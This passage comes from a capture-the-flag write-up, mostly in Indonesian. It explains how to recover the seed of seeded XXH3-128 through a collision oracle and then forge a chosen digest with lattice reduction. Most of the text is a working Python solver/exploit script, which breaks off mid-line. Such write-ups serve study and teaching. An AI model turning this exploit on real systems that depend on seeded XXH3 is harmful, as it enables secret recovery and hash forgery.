        "content": "Panjang 320 dipilih karena:\n\n- tetap masuk long-input mode;\n- terdiri dari empat regular stripe dan satu final stripe;\n- belum mencapai satu block penuh, sehingga tidak ada tahap scramble accumulator;\n- dua stripe pertama cukup untuk mengontrol semua delapan accumulator.\n\nDefinisikan:\n\n\\[\nF(a,b)=\\operatorname{lo}_{64}(ab)\\oplus\n\\operatorname{hi}_{64}(ab)\n\\]\n\nUntuk empat pasangan accumulator:\n\n\\[\nM_L=320P_1+\n\\sum_{i=0}^{3}\nF(A_{2i}\\oplus K^{L}_{i,0},\n  A_{2i+1}\\oplus K^{L}_{i,1})\n\\pmod{2^{64}}\n\\]\n\n\\[\nM_H=\\neg(320P_2)+\n\\sum_{i=0}^{3}\nF(A_{2i}\\oplus K^{H}_{i,0},\n  A_{2i+1}\\oplus K^{H}_{i,1})\n\\pmod{2^{64}}\n\\]\n\nKita membutuhkan:\n\n\\[\nM_L=T_L\n\\]\n\n\\[\nM_H=T_H\n\\]\n\nSehingga residual target:\n\n\\[\nN_L=T_L-320P_1\\pmod{2^{64}}\n\\]\n\n\\[\nN_H=T_H-\\neg(320P_2)\\pmod{2^{64}}\n\\]\n\n---"
      },
      {
        "title": "12. Memisahkan Persamaan Low dan High",
        "content": "Untuk pasangan accumulator `i=0,1`, pilih:\n\n\\[\nA_{2i}=K^{H}_{i,0}\n\\]\n\nMaka operand pertama pada merge high menjadi nol:\n\n\\[\nA_{2i}\\oplus K^{H}_{i,0}=0\n\\]\n\nKarena `F(0,x)=0`, pasangan tersebut tidak berkontribusi ke high merge.\n\nPilih accumulator ganjil:\n\n\\[\nA_{2i+1}=K^{L}_{i,1}\\oplus y_i\n\\]\n\nKontribusi low-nya menjadi:\n\n\\[\nF(K^{H}_{i,0}\\oplus K^{L}_{i,0},y_i)\n\\]\n\nDefinisikan:\n\n\\[\nc_i=K^{H}_{i,0}\\oplus K^{L}_{i,0}\n\\]\n\nMaka dua pasangan pertama harus memenuhi:\n\n\\[\n\\boxed{F(c_0,y_0)+F(c_1,y_1)=N_L\\pmod{2^{64}}}\n\\]\n\nUntuk pasangan `i=2,3`, lakukan kebalikannya:\n\n\\[\nA_{2i}=K^{L}_{i,0}\n\\]\n\nsehingga kontribusi low nol, dan:\n\n\\[\nA_{2i+1}=K^{H}_{i,1}\\oplus y_i\n\\]\n\nmemberikan:\n\n\\[\n\\boxed{F(c_2,y_2)+F(c_3,y_3)=N_H\\pmod{2^{64}}}\n\\]\n\nMasalah preimage 128-bit telah dipecah menjadi dua persamaan 64-bit yang independen.\n\n---"
      },
      {
        "title": "13. Persamaan Dasar",
        "content": "Kita ingin menyelesaikan:\n\n\\[\nF(c,y)=t\n\\]\n\nDefinisikan produk 128-bit:\n\n\\[\np=cy=p_L+2^{64}p_H\n\\]\n\nSyarat fold:\n\n\\[\np_L\\oplus p_H=t\n\\]\n\nMaka:\n\n\\[\np_L=t\\oplus p_H\n\\]\n\nsehingga:\n\n\\[\ncy=(t\\oplus p_H)+2^{64}p_H\n\\]\n\nTuliskan bit `p_H` sebagai:\n\n\\[\np_H=\\sum_{j=0}^{63}h_j2^j,\n\\qquad h_j\\in\\{0,1\\}\n\\]\n\nUntuk bit target `t_j`:\n\n\\[\nt\\oplus p_H\n=t+\n\\sum_{j=0}^{63}\nh_j2^j(1-2t_j)\n\\]\n\nGabungkan dengan `2^64 p_H`:\n\n\\[\ncy=t+\n\\sum_{j=0}^{63}\nh_j2^j(2^{64}+1-2t_j)\n\\]\n\nDefinisikan:\n\n\\[\na_j=2^j(2^{64}+1-2t_j)\n\\]\n\nKita mencari bit `h_j` sehingga:\n\n\\[\n\\boxed{t+\\sum_{j=0}^{63}h_ja_j\\equiv0\\pmod c}\n\\]\n\nJika kongruensi terpenuhi:\n\n\\[\ny=\\frac{t+\\sum h_ja_j}{c}\n\\]\n\nlalu diverifikasi bahwa:\n\n\\[\n0\\le y<2^{64}\n\\]\n\n dan:\n\n\\[\nF(c,y)=t\n\\]\n\nIni adalah modular subset-sum 64 variabel biner.\n\n---"
      },
      {
        "title": "14. Embedding Lattice 66 Dimensi",
        "content": "Gunakan embedding berikut secara konseptual.\n\nUntuk `j=0..63`, buat basis row:\n\n\\[\nb_j=(2e_j,\\;0,\\;Ma_j)\n\\]\n\nTambahkan target row:\n\n\\[\nb_T=(-1,-1,\\ldots,-1,\\;T,\\;Mt)\n\\]\n\nserta modulus row:\n\n\\[\nb_c=(0,\\ldots,0,\\;0,\\;Mc)\n\\]\n\nUntuk pilihan bit `h_j` dan suatu integer `k`, kombinasi:\n\n\\[\nv=b_T+\n\\sum_{j=0}^{63}h_jb_j+kb_c\n\\]\n\nmemiliki 64 koordinat awal:\n\n\\[\n2h_j-1\\in\\{-1,+1\\}\n\\]\n\nKoordinat terakhir:\n\n\\[\nM\\left(t+\n\\sum h_ja_j+kc\\right)\n\\]\n\nJika kongruensi terpenuhi, pilih `k` sehingga koordinat terakhir nol. Vektor solusi kemudian berbentuk:\n\n\\[\n(\\pm1,\\pm1,\\ldots,\\pm1,T,0)\n\\]\n\nVektor seperti ini sangat pendek dibanding kombinasi acak. LLL lalu BKZ dipakai untuk menemukannya.\n\nImplementasi menambahkan beberapa stabilisasi:\n\n- permutasi random pada 64 bit;\n- kelipatan acak dari `c` pada kolom embedding;\n- variasi scale `M`;\n- variasi marker `T`;\n- block size BKZ bertahap.\n\nSetelah vektor ditemukan, tanda `±1` dikonversi kembali menjadi bit `h_j`, lalu `y` direkonstruksi dan diverifikasi secara eksak.\n\n---"
      },
      {
        "title": "15. Mengapa Memakai Dua `fold128`",
        "content": "Tidak semua target `t` mudah ditemukan sebagai image langsung dari `F(c,y)` untuk satu `c` tertentu.\n\nSolver memilih `y_0` acak dan menghitung:\n\n\\[\nt'=N_L-F(c_0,y_0)\\pmod{2^{64}}\n\\]\n\nKemudian lattice hanya perlu menyelesaikan:\n\n\\[\nF(c_1,y_1)=t'\n\\]\n\nJika gagal, pilih `y_0` baru. Cara sama dipakai untuk high target.\n\nHasil akhirnya:\n\n\\[\nF(c_0,y_0)+F(c_1,y_1)=N_L\n\\]\n\n\\[\nF(c_2,y_2)+F(c_3,y_3)=N_H\n\\]\n\n---"
      },
      {
        "title": "16. Menonaktifkan Kontribusi Perkalian",
        "content": "Setelah delapan accumulator target `A_i` diketahui, payload dibuat menggunakan dua stripe pertama.\n\nUntuk satu source lane, secret word pada stripe pertama adalah:\n\n\\[\nk_0=k_{0,H}2^{32}+k_{0,L}\n\\]\n\nsecret word stripe kedua:\n\n\\[\nk_1=k_{1,H}2^{32}+k_{1,L}\n\\]\n\nPilih word data:\n\n\\[\nd_0=a2^{32}+k_{0,L}\n\\]\n\n\\[\nd_1=k_{1,H}2^{32}+b\n\\]\n\nPada stripe pertama:\n\n\\[\n\\operatorname{lo}_{32}(d_0\\oplus k_0)=0\n\\]\n\nmaka produk 32×32 adalah nol.\n\nPada stripe kedua:\n\n\\[\n\\operatorname{hi}_{32}(d_1\\oplus k_1)=0\n\\]\n\nmaka produknya juga nol.\n\nJadi dua word ini hanya mengubah accumulator silang melalui:\n\n\\[\nd_0+d_1\\pmod{2^{64}}\n\\]\n\n---"
      },
      {
        "title": "17. Menyelesaikan Word Data Secara Eksak",
        "content": "Misalkan correction yang dibutuhkan untuk accumulator silang adalah:\n\n\\[\nS=S_H2^{32}+S_L\n\\]\n\nKita butuh:\n\n\\[\nd_0+d_1=S\\pmod{2^{64}}\n\\]\n\nDengan bentuk pilihan di atas:\n\n\\[\nd_0+d_1=\n(a+k_{1,H}+c)2^{32}\n+(k_{0,L}+b\\bmod2^{32})\n\\]\n\nPilih low-half:\n\n\\[\n\\boxed{b=S_L-k_{0,L}\\pmod{2^{32}}}\n\\]\n\nCarry dari penjumlahan low-half:\n\n\\[\nc=\\left\\lfloor\n\\frac{k_{0,L}+b}{2^{32}}\n\\right\\rfloor\n\\]\n\nLalu high-half:\n\n\\[\n\\boxed{a=S_H-k_{1,H}-c\\pmod{2^{32}}}\n\\]\n\nIni langsung menghasilkan dua word yang:\n\n- memberikan penambahan tepat `S` ke accumulator pasangan;\n- memberikan kontribusi perkalian nol ke accumulator lane sendiri.\n\nStripe 2, stripe 3, dan final stripe diisi nol. Kontribusi tetap dari zero word sudah dihitung terlebih dahulu dalam `fixed accumulator`.\n\nSetelah semua lane dirakit:\n\n\n\n---\n\n\n\n\n---\n\n\nSeeded XXH3 bukan MAC kriptografis. Pada long-input mode, seed hanya menggeser word default secret dengan `+seed` dan `-seed`. Update accumulator mempertahankan struktur bilinear 32-bit yang dapat dimanipulasi dengan chosen input.\n\nInti matematis serangannya:\n\n1. Buat dua payload dengan jumlah data sama.\n2. Paksa selisih produk menjadi:\n\n   \\[\n   \\pm2^b[(R\\oplus S_1)-S_0]\n   \\]\n\n3. Collision memberi XOR dua half secret.\n4. Gunakan pembatalan `+seed` dan `-seed` untuk mendapatkan:\n\n   \\[\n   x+y=Q,\n   \\qquad x\\oplus y=R\n   \\]\n\n5. Selesaikan sistem tersebut bit per bit untuk memperoleh seed.\n6. Balik avalanche target.\n7. Ubah inverse `fold128` menjadi modular subset-sum.\n8. Gunakan LLL/BKZ pada lattice 66 dimensi.\n9. Rakit payload agar kontribusi perkalian stripe kontrol bernilai nol.\n\nFlag:",
        "code": "assert model_accumulators(payload, seed) == desired_accumulators\nassert xxhash.xxh3_128(payload, seed=seed).digest() == b\"Give me the flag\""
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport argparse\r\nimport functools\r\nimport random\r\nimport re\r\nimport socket\r\nimport subprocess\r\nimport threading\r\nimport time\r\nfrom typing import Iterable\r\n\r\nimport numpy as np\r\nimport xxhash\r\n\r\ntry:\r\n    from fpylll import BKZ, LLL, IntegerMatrix\r\nexcept ImportError as exc:\r\n    raise SystemExit(\r\n        \"Missing fpylll. Install dependencies with: \"\r\n        \"pip install xxhash numpy fpylll cysignals\"\r\n    ) from exc\r\n\r\nMASK64 = (1 << 64) - 1\r\nMASK32 = (1 << 32) - 1\r\nP32_1 = 0x9E3779B1\r\nP32_2 = 0x85EBCA77\r\nP32_3 = 0xC2B2AE3D\r\nP64_1 = 0x9E3779B185EBCA87\r\nP64_2 = 0xC2B2AE3D27D4EB4F\r\nP64_3 = 0x165667B19E3779F9\r\nP64_4 = 0x85EBCA77C2B2AE63\r\nP64_5 = 0x27D4EB2F165667C5\r\nAVALANCHE_MUL = 0x165667919E3779F9\r\nTARGET = b\"Give me the flag\"\r\n\r\nDEFAULT_SECRET = bytes([\r\n    0xB8,0xFE,0x6C,0x39,0x23,0xA4,0x4B,0xBE,0x7C,0x01,0x81,0x2C,0xF7,0x21,0xAD,0x1C,\r\n    0xDE,0xD4,0x6D,0xE9,0x83,0x90,0x97,0xDB,0x72,0x40,0xA4,0xA4,0xB7,0xB3,0x67,0x1F,\r\n    0xCB,0x79,0xE6,0x4E,0xCC,0xC0,0xE5,0x78,0x82,0x5A,0xD0,0x7D,0xCC,0xFF,0x72,0x21,\r\n    0xB8,0x08,0x46,0x74,0xF7,0x43,0x24,0x8E,0xE0,0x35,0x90,0xE6,0x81,0x3A,0x26,0x4C,\r\n    0x3C,0x28,0x52,0xBB,0x91,0xC3,0x00,0xCB,0x88,0xD0,0x65,0x8B,0x1B,0x53,0x2E,0xA3,\r\n    0x71,0x64,0x48,0x97,0xA2,0x0D,0xF9,0x4E,0x38,0x19,0xEF,0x46,0xA9,0xDE,0xAC,0xD8,\r\n    0xA8,0xFA,0x76,0x3F,0xE3,0x9C,0x34,0x3F,0xF9,0xDC,0xBB,0xC7,0xC7,0x0B,0x4F,0x1D,\r\n    0x8A,0x51,0xE0,0x4B,0xCD,0xB4,0x59,0x31,0xC8,0x9F,0x7E,0xC9,0xD9,0x78,0x73,0x64,\r\n    0xEA,0xC5,0xAC,0x83,0x34,0xD3,0xEB,0xC3,0xC5,0x81,0xA0,0xFF,0xFA,0x13,0x63,0xEB,\r\n    0x17,0x0D,0xDD,0x51,0xB7,0xF0,0xDA,0x49,0xD3,0x16,0x55,0x26,0x29,0xD4,0x68,0x9E,\r\n    0x2B,0x16,0xBE,0x58,0x7D,0x47,0xA1,0xFC,0x8F,0xF8,0xB8,0xD1,0x7A,0xD0,0x31,0xCE,\r\n    0x45,0xCB,0x3A,0x8F,0x95,0x16,0x04,0x28,0xAF,0xD7,0xFB,0xCA,0xBB,0x4B,0x40,0x7E,\r\n])\r\n\r\nINIT_ACC = [P32_3, P64_1, P64_2, P64_3, P64_4, P32_2, P64_5, P32_1]\r\nC_WORDS = [int.from_bytes(DEFAULT_SECRET[8*i:8*i+8], \"little\") for i in range(24)]\r\n\r\n\r\ndef xxh_hex(data: bytes, seed: int) -> str:\r\n    return xxhash.xxh3_128(data, seed=seed).hexdigest()\r\n\r\n\r\ndef xxh_digest(data: bytes, seed: int) -> bytes:\r\n    return xxhash.xxh3_128(data, seed=seed).digest()\r\n\r\n\r\ndef u64(data: bytes, off: int = 0) -> int:\r\n    return int.from_bytes(data[off:off+8], \"little\")\r\n\r\n\r\ndef custom_secret(seed: int) -> bytes:\r\n    out = bytearray(192)\r\n    for i in range(12):\r\n        lo = (u64(DEFAULT_SECRET, 16*i) + seed) & MASK64\r\n        hi = (u64(DEFAULT_SECRET, 16*i+8) - seed) & MASK64\r\n        out[16*i:16*i+8] = lo.to_bytes(8, \"little\")\r\n        out[16*i+8:16*i+16] = hi.to_bytes(8, \"little\")\r\n    return bytes(out)\r\n\r\n\r\ndef fold128(a: int, b: int) -> int:\r\n    p = a * b\r\n    return ((p & MASK64) ^ (p >> 64)) & MASK64\r\n\r\n\r\ndef avalanche(x: int) -> int:\r\n    x ^= x >> 37\r\n    x = (x * AVALANCHE_MUL) & MASK64\r\n    x ^= x >> 32\r\n    return x & MASK64\r\n\r\n\r\ndef inverse_avalanche(y: int) -> int:\r\n    # Both shifts exceed half the word size, so one reverse-xorshift step is enough.\r\n    x = y ^ (y >> 32)\r\n    x = (x * pow(AVALANCHE_MUL, -1, 1 << 64)) & MASK64\r\n    x ^= x >> 37\r\n    return x & MASK64\r\n\r\n\r\ndef accum_stripe(acc: list[int], data: bytes, off: int, secret: bytes, soff: int) -> None:\r\n    for lane in range(8):\r\n        d = u64(data, off + 8*lane)\r\n        k = u64(secret, soff + 8*lane)\r\n        q = d ^ k\r\n        acc[lane ^ 1] = (acc[lane ^ 1] + d) & MASK64\r\n        acc[lane] = (acc[lane] + (q & MASK32) * (q >> 32)) & MASK64\r\n\r\n\r\ndef model_hash_320(data: bytes, seed: int) -> tuple[int, int, list[int]]:\r\n    if len(data) != 320:\r\n        raise ValueError(\"model_hash_320 expects exactly 320 bytes\")\r\n    secret = custom_secret(seed)\r\n    acc = INIT_ACC.copy()\r\n    for stripe in range(4):\r\n        accum_stripe(acc, data, 64*stripe, secret, 8*stripe)\r\n    accum_stripe(acc, data, 256, secret, 121)\r\n\r\n    lo = (320 * P64_1) & MASK64\r\n    hi = (~(320 * P64_2)) & MASK64\r\n    for i in range(4):\r\n        lo = (lo + fold128(\r\n            acc[2*i] ^ u64(secret, 11 + 16*i),\r\n            acc[2*i+1] ^ u64(secret, 19 + 16*i),\r\n        )) & MASK64\r\n        hi = (hi + fold128(\r\n            acc[2*i] ^ u64(secret, 117 + 16*i),\r\n            acc[2*i+1] ^ u64(secret, 125 + 16*i),\r\n        )) & MASK64\r\n    return avalanche(lo), avalanche(hi), acc\r\n\r\n\r\n# ---------------------------------------------------------------------------\r\n# Seed-recovery arithmetic\r\n# ---------------------------------------------------------------------------\r\n\r\n\r\ndef count_preimages_sumxor(Q: int, R: int) -> int:\r\n    states = {0: 1}\r\n    for i in range(32):\r\n        q = (Q >> i) & 1\r\n        r = (R >> i) & 1\r\n        nxt: dict[int, int] = {}\r\n        for carry, count in states.items():\r\n            for xb in (0, 1):\r\n                yb = xb ^ r\r\n                total = xb + yb + carry\r\n                if (total & 1) == q:\r\n                    nxt[total >> 1] = nxt.get(total >> 1, 0) + count\r\n        states = nxt\r\n        if not states:\r\n            return 0\r\n    return sum(states.values())\r\n\r\n\r\n@functools.lru_cache(maxsize=128)\r\ndef possible_r_cached(Q: int) -> np.ndarray:\r\n    Q &= MASK32\r\n    states = [np.array([0], dtype=np.uint32), np.array([], dtype=np.uint32)]\r\n    for i in range(32):\r\n        q = (Q >> i) & 1\r\n        bit = np.uint32(1 << i)\r\n        outs: list[list[np.ndarray]] = [[], []]\r\n        for carry, arr in enumerate(states):\r\n            if arr.size == 0:\r\n                continue\r\n            if q == carry:\r\n                outs[0].append(arr)\r\n                outs[1].append(arr)\r\n            else:\r\n                outs[carry].append(arr | bit)\r\n        states = []\r\n        for parts in outs:\r\n            if not parts:\r\n                states.append(np.array([], dtype=np.uint32))\r\n            elif len(parts) == 1:\r\n                states.append(parts[0].copy())\r\n            else:\r\n                states.append(np.unique(np.concatenate(parts)))\r\n    return np.unique(np.concatenate([x for x in states if x.size]))\r\n\r\n\r\ndef invert_sum_xor(Q: int, R: int) -> np.ndarray:\r\n    states: dict[int, np.ndarray] = {0: np.array([0], dtype=np.uint32)}\r\n    for i in range(32):\r\n        q = (Q >> i) & 1\r\n        r = (R >> i) & 1\r\n        outs: dict[int, list[np.ndarray]] = {0: [], 1: []}\r\n        for carry, arr in states.items():\r\n            for xb in (0, 1):\r\n                yb = xb ^ r\r\n                total = xb + yb + carry\r\n                if (total & 1) == q:\r\n                    outs[total >> 1].append(arr | np.uint32(xb << i))\r\n        states = {\r\n            c: parts[0] if len(parts) == 1 else np.concatenate(parts)\r\n            for c, parts in outs.items() if parts\r\n        }\r\n        if not states:\r\n            return np.array([], dtype=np.uint32)\r\n    return np.concatenate(list(states.values()))\r\n\r\n\r\ndef low_word(seed_low: int, index: int) -> int:\r\n    c = C_WORDS[index] & MASK32\r\n    return (c + seed_low) & MASK32 if index % 2 == 0 else (c - seed_low) & MASK32\r\n\r\n\r\ndef high_word(seed_low: int, seed_high: int, index: int) -> int:\r\n    c_lo = C_WORDS[index] & MASK32\r\n    c_hi = C_WORDS[index] >> 32\r\n    if index % 2 == 0:\r\n        carry = int(c_lo + seed_low > MASK32)\r\n        return (c_hi + seed_high + carry) & MASK32\r\n    borrow = int(c_lo < seed_low)\r\n    return (c_hi - seed_high - borrow) & MASK32\r\n\r\n\r\ndef relation_low_vec(seeds: np.ndarray, i: int, j: int) -> np.ndarray:\r\n    s = seeds.astype(np.uint64)\r\n\r\n    def part(k: int) -> np.ndarray:\r\n        c = np.uint64(C_WORDS[k] & MASK32)\r\n        return ((c + s) if k % 2 == 0 else (c - s)) & np.uint64(MASK32)\r\n\r\n    return (part(i) ^ part(j)).astype(np.uint32)\r\n\r\n\r\ndef relation_high_vec(seed_lows: np.ndarray, seed_highs: np.ndarray, i: int, j: int) -> np.ndarray:\r\n    sl = seed_lows.astype(np.uint64)\r\n    sh = seed_highs.astype(np.uint64)\r\n\r\n    def part(k: int) -> np.ndarray:\r\n        c_lo = C_WORDS[k] & MASK32\r\n        c_hi = C_WORDS[k] >> 32\r\n        if k % 2 == 0:\r\n            carry = (sl > np.uint64(MASK32 - c_lo)).astype(np.uint64)\r\n            return (np.uint64(c_hi) + sh + carry) & np.uint64(MASK32)\r\n        borrow = (sl > np.uint64(c_lo)).astype(np.uint64)\r\n        return (np.uint64(c_hi) - sh - borrow) & np.uint64(MASK32)\r\n\r\n    return (part(i) ^ part(j)).astype(np.uint32)\r\n\r\n\r\ndef pair_placement(i: int, j: int) -> tuple[int, int, int, int]:\r\n    i, j = sorted((int(i), int(j)))\r\n    lo = max(0, j - 14)\r\n    hi = min(7, i)\r\n    if lo > hi:\r\n        raise ValueError(\"secret words cannot share a regular lane\")\r\n    lane = hi\r\n    stripe_i = i - lane\r\n    stripe_j = j - lane\r\n    length = max(320, 64 * (max(stripe_i, stripe_j) + 2))\r\n    return lane, stripe_i, stripe_j, length\r\n\r\n\r\ndef initial_low_distribution(i: int, j: int) -> tuple[np.ndarray, np.ndarray]:\r\n    if not ((i ^ j) & 1):\r\n        raise ValueError(\"initial relation requires opposite parity\")\r\n    plus = i if i % 2 == 0 else j\r\n    minus = j if i % 2 == 0 else i\r\n    Q = ((C_WORDS[plus] & MASK32) + (C_WORDS[minus] & MASK32)) & MASK32\r\n    vals = possible_r_cached(Q)\r\n    weights = np.array([count_preimages_sumxor(Q, int(r)) for r in vals], dtype=np.uint64)\r\n    return vals, weights\r\n\r\n\r\ndef low_candidates_from_relation(i: int, j: int, R: int) -> np.ndarray:\r\n    plus = i if i % 2 == 0 else j\r\n    minus = j if i % 2 == 0 else i\r\n    Q = ((C_WORDS[plus] & MASK32) + (C_WORDS[minus] & MASK32)) & MASK32\r\n    x_plus = invert_sum_xor(Q, R)\r\n    seeds = ((x_plus.astype(np.uint64) - np.uint64(C_WORDS[plus] & MASK32)) & np.uint64(MASK32)).astype(np.uint32)\r\n    relation = relation_low_vec(seeds, i, j)\r\n    return np.unique(seeds[relation == np.uint32(R)])\r\n\r\n\r\ndef qhigh_pair(seed_low: int, i: int, j: int) -> int:\r\n    plus = i if i % 2 == 0 else j\r\n    minus = j if i % 2 == 0 else i\r\n    cp = C_WORDS[plus] & MASK32\r\n    cm = C_WORDS[minus] & MASK32\r\n    carry = int(cp + seed_low > MASK32)\r\n    borrow = int(cm < seed_low)\r\n    return ((C_WORDS[plus] >> 32) + (C_WORDS[minus] >> 32) + carry - borrow) & MASK32\r\n\r\n\r\ndef high_candidates_from_relation(seed_low: int, i: int, j: int, R: int) -> np.ndarray:\r\n    plus = i if i % 2 == 0 else j\r\n    Q = qhigh_pair(seed_low, i, j)\r\n    b_plus = invert_sum_xor(Q, R)\r\n    if b_plus.size == 0:\r\n        return b_plus\r\n    cp = C_WORDS[plus] & MASK32\r\n    carry = int(cp + seed_low > MASK32)\r\n    seed_highs = ((b_plus.astype(np.uint64) - np.uint64((C_WORDS[plus] >> 32) + carry)) & np.uint64(MASK32)).astype(np.uint32)\r\n    lows = np.full(seed_highs.size, np.uint32(seed_low), dtype=np.uint32)\r\n    relation = relation_high_vec(lows, seed_highs, i, j)\r\n    return np.unique(seed_highs[relation == np.uint32(R)])\r\n\r\n\r\ndef initial_high_distribution(low_candidates: np.ndarray, i: int, j: int) -> tuple[np.ndarray, np.ndarray]:\r\n    qs = [qhigh_pair(int(s), i, j) for s in low_candidates]\r\n    arrays = [possible_r_cached(q) for q in qs]\r\n    vals = np.unique(np.concatenate(arrays))\r\n    weights = np.array([\r\n        sum(count_preimages_sumxor(q, int(r)) for q in qs)\r\n        for r in vals\r\n    ], dtype=np.uint64)\r\n    return vals, weights\r\n\r\n\r\n# Small DFA for counting valid XOR outputs of x+y=Q without materializing them.\r\ndef _carry_transition(state: int, q: int, r: int) -> int:\r\n    if state == 0:\r\n        return 0\r\n    if r == 0:\r\n        return 3 if state & (1 << q) else 0\r\n    carry = 1 - q\r\n    return (1 << carry) if state & (1 << carry) else 0\r\n\r\n\r\ndef count_relation_union(qs: Iterable[int]) -> int:\r\n    uniq = tuple(dict.fromkeys(int(q) & MASK32 for q in qs))\r\n    dp: dict[tuple[int, ...], int] = {(1,) * len(uniq): 1}\r\n    for bit in range(32):\r\n        nxt: dict[tuple[int, ...], int] = {}\r\n        for states, count in dp.items():\r\n            for r in (0, 1):\r\n                ns = tuple(_carry_transition(states[k], (uniq[k] >> bit) & 1, r) for k in range(len(uniq)))\r\n                if any(ns):\r\n                    nxt[ns] = nxt.get(ns, 0) + count\r\n        dp = nxt\r\n    return sum(dp.values())\r\n\r\n\r\n# ---------------------------------------------------------------------------\r\n# Chosen-input collision oracle\r\n# ---------------------------------------------------------------------------\r\n\r\nLOW_INIT = (2, 7)\r\nLOW_FILTERS = [\r\n    (0,2),(6,8),(0,1),(6,9),(1,3),(3,5),(5,7),(7,11),(11,13),\r\n    (8,11),(1,4),(8,9),(2,5),(3,8),(9,11),(10,11),(4,6),(7,8),\r\n]\r\nALL_PAIRS: list[tuple[int, int, int]] = []\r\nOPPOSITE_PAIRS: list[tuple[int, int, int]] = []\r\nfor _i in range(15):\r\n    for _j in range(_i + 1, 15):\r\n        try:\r\n            _n = pair_placement(_i, _j)[3]\r\n        except ValueError:\r\n            continue\r\n        ALL_PAIRS.append((_i, _j, _n))\r\n        if (_i ^ _j) & 1:\r\n            OPPOSITE_PAIRS.append((_i, _j, _n))\r\n\r\n\r\ndef relation_messages(R: int, pair: tuple[int, int], bit: int, kind: str) -> tuple[bytes, bytes]:\r\n    i, j = pair\r\n    lane, stripe_i, stripe_j, length = pair_placement(i, j)\r\n    off_i = 64 * stripe_i + 8 * lane\r\n    off_j = 64 * stripe_j + 8 * lane\r\n    a = bytearray(length)\r\n    b = bytearray(length)\r\n\r\n    if kind == \"low\":\r\n        a[off_j:off_j+8] = (((1 << bit) << 32) | R).to_bytes(8, \"little\")\r\n        b[off_i:off_i+8] = ((1 << bit) << 32).to_bytes(8, \"little\")\r\n        b[off_j:off_j+8] = R.to_bytes(8, \"little\")\r\n    elif kind == \"high\":\r\n        a[off_j:off_j+8] = ((R << 32) | (1 << bit)).to_bytes(8, \"little\")\r\n        b[off_i:off_i+8] = (1 << bit).to_bytes(8, \"little\")\r\n        b[off_j:off_j+8] = (R << 32).to_bytes(8, \"little\")\r\n    else:\r\n        raise ValueError(kind)\r\n    return bytes(a), bytes(b)\r\n\r\n\r\ndef ordered_candidates(vals: np.ndarray, weights: np.ndarray) -> np.ndarray:\r\n    return np.asarray(vals, dtype=np.uint32)[\r\n        np.argsort(-np.asarray(weights, dtype=np.int64), kind=\"stable\")\r\n    ]\r\n\r\n\r\ndef final_carries(Q: int, R: int) -> set[int]:\r\n    states = {0}\r\n    for i in range(32):\r\n        q = (Q >> i) & 1\r\n        r = (R >> i) & 1\r\n        nxt: set[int] = set()\r\n        for carry in states:\r\n            for xb in (0, 1):\r\n                yb = xb ^ r\r\n                total = xb + yb + carry\r\n                if (total & 1) == q:\r\n                    nxt.add(total >> 1)\r\n        states = nxt\r\n        if not states:\r\n            break\r\n    return states\r\n\r\n\r\ndef guaranteed_high_equal_bits(pair: tuple[int, int], R: int) -> list[int]:\r\n    i, j = pair\r\n    plus = i if i % 2 == 0 else j\r\n    minus = j if i % 2 == 0 else i\r\n    cp = C_WORDS[plus] & MASK32\r\n    cm = C_WORDS[minus] & MASK32\r\n    low_sum = cp + cm\r\n    Q_low = low_sum & MASK32\r\n    qcarry = low_sum >> 32\r\n    high_base = ((C_WORDS[plus] >> 32) + (C_WORDS[minus] >> 32)) & MASK32\r\n\r\n    bits: list[int] = []\r\n    for carry_out in final_carries(Q_low, R):\r\n        Q_high = (high_base + qcarry - carry_out) & MASK32\r\n        for bit in range(32):\r\n            if ((Q_high >> bit) & 1) == 0:\r\n                bits.append(bit)\r\n                break\r\n    return sorted(set(bits))\r\n\r\n\r\ndef find_unknown_low_relation(oracle, vals: np.ndarray, weights: np.ndarray, pair: tuple[int, int]) -> int:\r\n    vals = ordered_candidates(vals, weights)\r\n    batch_size = 64\r\n    for start in range(0, len(vals), batch_size):\r\n        chunk = vals[start:start+batch_size]\r\n        payloads: list[bytes] = []\r\n        metadata: list[tuple[int, int]] = []\r\n        for r_np in chunk:\r\n            r = int(r_np)\r\n            bits = guaranteed_high_equal_bits(pair, r) if ((pair[0] ^ pair[1]) & 1) else range(6)\r\n            for bit in bits:\r\n                payloads.extend(relation_messages(r, pair, bit, \"low\"))\r\n                metadata.append((r, len(payloads) - 2))\r\n        hashes = oracle.hash_many(payloads)\r\n        for r, pos in metadata:\r\n            if hashes[pos] == hashes[pos + 1]:\r\n                return r\r\n    raise RuntimeError(\"low relation was not found\")\r\n\r\n\r\ndef find_known_high_relation(\r\n    oracle,\r\n    vals: np.ndarray,\r\n    weights: np.ndarray,\r\n    pair: tuple[int, int],\r\n    bit: int,\r\n) -> int:\r\n    vals = ordered_candidates(vals, weights)\r\n    batch_size = 64\r\n    for start in range(0, len(vals), batch_size):\r\n        chunk = vals[start:start+batch_size]\r\n        payloads: list[bytes] = []\r\n        for r_np in chunk:\r\n            payloads.extend(relation_messages(int(r_np), pair, bit, \"high\"))\r\n        hashes = oracle.hash_many(payloads)\r\n        for idx, r_np in enumerate(chunk):\r\n            if hashes[2*idx] == hashes[2*idx + 1]:\r\n                return int(r_np)\r\n    raise RuntimeError(\"high relation was not found\")\r\n\r\n\r\ndef common_zero_bit(low_values: np.ndarray, pair: tuple[int, int]) -> int | None:\r\n    rel = relation_low_vec(np.asarray(low_values, dtype=np.uint32), *pair)\r\n    for bit in range(32):\r\n        if np.all(((rel >> np.uint32(bit)) & np.uint32(1)) == 0):\r\n            return bit\r\n    return None\r\n\r\n\r\ndef expected_guesswork(weights: np.ndarray) -> float:\r\n    w = np.asarray(weights, dtype=np.float64)\r\n    order = np.argsort(-w, kind=\"stable\")\r\n    return float(np.dot(np.arange(1, len(w) + 1), w[order]) / w.sum())\r\n\r\n\r\ndef recover_low_half(oracle, verbose: bool = True) -> np.ndarray:\r\n    vals, weights = initial_low_distribution(*LOW_INIT)\r\n    relation = find_unknown_low_relation(oracle, vals, weights, LOW_INIT)\r\n    candidates = low_candidates_from_relation(*LOW_INIT, relation)\r\n    if verbose:\r\n        print(f\"[+] low relation {LOW_INIT}: {relation:#010x}; candidates={len(candidates)}; queries={oracle.queries}\", flush=True)\r\n\r\n    # A low-relation collision is deterministic only for opposite-parity\r\n    # secret words (+seed versus -seed).  Same-parity pairs require the\r\n    # unknown high words to share a tested bit; the old range(6) heuristic\r\n    # can therefore miss the true relation for unlucky seeds.\r\n    safe_low_filters = [pair for pair in LOW_FILTERS if (pair[0] 